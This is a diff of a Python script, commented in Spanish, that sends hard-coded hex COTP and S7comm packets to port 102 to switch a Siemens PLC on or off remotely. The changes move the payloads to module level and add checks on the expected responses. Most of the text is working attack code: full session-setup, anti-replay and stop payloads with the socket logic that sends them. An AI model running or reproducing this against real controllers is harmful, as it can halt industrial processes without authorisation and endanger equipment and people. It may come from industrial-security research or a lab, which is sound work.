@@ -23,13 +23,20 @@ import sys
 import io
 import re
 
+# Payloads
+# Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
+vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+vRespPayloadSolComCOTP = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
+# Segundo payload: Solicitud de comunicación S7comm
+vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+vRespPayloadSolComS7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
+
 # Definir constantes para colores
 cColorAzul='\033[0;34m'
 cColorAzulClaro='\033[1;34m'
 cColorVerde='\033[1;32m'
 cColorRojo='\033[1;31m'
 cFinColor='\033[0m' # Vuelve al color normal
-
 
 def fDeterminarSiIPoFQDN(pHost):
   # Expresión regular para validar una dirección IP
@@ -43,14 +50,6 @@ def fDeterminarSiIPoFQDN(pHost):
 
 
 def fEncenderPLC(pHost):
-
-  # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
-  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-  vRespPayloadSolComCOTP = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
-
-  # Segundo payload: Solicitud de comunicación S7comm
-  vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
-  vRespPayloadSolComS7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
 
   # Tercer payload: Anti-replay
   vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
@@ -140,12 +139,6 @@ def fEncenderPLC(pHost):
 
 def fApagarPLC(pHost):
 
-  # Primer payload: Solicitud de comunicación COTP para encendido/apagado del PLC
-  vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-
-  # Segundo payload: Solicitud de comunicación S7comm
-  vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
-
   # Tercer payload: Anti-replay
   vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
 
@@ -154,65 +147,80 @@ def fApagarPLC(pHost):
 
   try:
     vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    vSocketConPLC.settimeout(5)
+    vSocketConPLC.settimeout(2)
     vSocketConPLC.connect((pHost, 102))
 
     # 1. Enviar primer payload: vPayloadSolComCOTP
     vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
+    print(f"Solicitud: {vPayloadSolComCOTP}")
     data = vSocketConPLC.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar vPayloadSolComCOTP")
+      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
       vSocketConPLC.close()
       return
-    print(f"Respuesta a vPayloadSolComCOTP: {data.hex()}")
+    data_hex = data.hex()
+    print(f"Respuesta: {data_hex}")
+    # Verificar que la respuesta sea la esperada
+    if data_hex != vRespPayloadSolComCOTP:
+      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
+      vSocketConPLC.close()
+      return
 
     # 2. Enviar segundo payload: vPayloadSolComS7
     vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
+    print(f"Solicitud: {vPayloadSolComS7}")
     data = vSocketConPLC.recv(1024)
     if not data:
-      print("No se recibió respuesta al enviar vPayloadSolComS7")
+      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
       vSocketConPLC.close()
       return
-    print(f"Respuesta a vPayloadSolComS7: {data.hex()}")
+    data_hex = data.hex()
+    print(f"Respuesta: {data_hex}")
+    # Verificar que la respuesta sea la esperada
+    if data_hex != vRespPayloadSolComS7:
+      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
+      vSocketConPLC.close()
+      return
 
     # 3. Enviar tercer payload: vPayloadAntiReplay
     vSocketConPLC.send(bytearray.fromhex(vPayloadAntiReplay))
+    print(f"Solicitud: {vPayloadAntiReplay}")
     data = vSocketConPLC.recv(1024)
     if not data:
       print("No se recibió respuesta al enviar vPayloadAntiReplay")
       vSocketConPLC.close()
       return
-    print(f"Respuesta a vPayloadAntiReplay: {data.hex()}")
-
-    # 4. Enviar cuarto payload: vPayloadApagar
-    vSocketConPLC.send(bytearray.fromhex(vPayloadApagar))
-    data = vSocketConPLC.recv(1024)
-    if not data:
-      print("No se recibió respuesta al enviar vPayloadApagar")
+    data_hex = data.hex()
+    print(f"Respuesta: {data_hex}")
+    # Verificar que la respuesta sea la esperada
+    if data_hex != vRespPayloadAntiReplay:
+      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
       vSocketConPLC.close()
       return
-    print(f"Respuesta a vPayloadApagar: {data.hex()}")
 
-    print("\n PLC apagado correctamente!")
+    # 4. Enviar cuarto payload: vPayloadEncender
+    vSocketConPLC.send(bytearray.fromhex(vPayloadApagar))
+    print(f"Solicitud: {vPayloadApagar}")
+    data = vSocketConPLC.recv(1024)
+    if not data:
+      print(f"No se recibió respuesta al enviar {vPayloadApagar}")
+      vSocketConPLC.close()
+      return
+    data_hex = data.hex()
+    print(f"Respuesta: {data_hex}")
+    # Verificar que la respuesta sea la esperada
+    if data_hex != vRespPayloadApagar:
+      print("La respuesta a vPayloadApagar no es la esperada. Abortando.")
+      vSocketConPLC.close()
+      return
+
+    print("\nPLC apagado correctamente!")
   except socket.timeout:
     print("Se agotó el tiempo de espera al comunicarse con el PLC")
   except Exception as e:
     print(f"Error al conectar o comunicarse con el PLC: {e}")
   finally:
     vSocketConPLC.close()
-
-
-def fConectar(pHost):
-  print(f"Intentando conectar con {pHost} en el puerto 102...")
-  vSocketPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  vSocketPLC.settimeout(5)
-  try:
-    vSocketPLC.connect((pHost, 102))
-    print("\n  Conexión establecida.")
-    return vSocketPLC
-  except socket.error as e:
-    print(f"\n  Error al conectar con el PLC: {e}")
-    return None
 
 
 
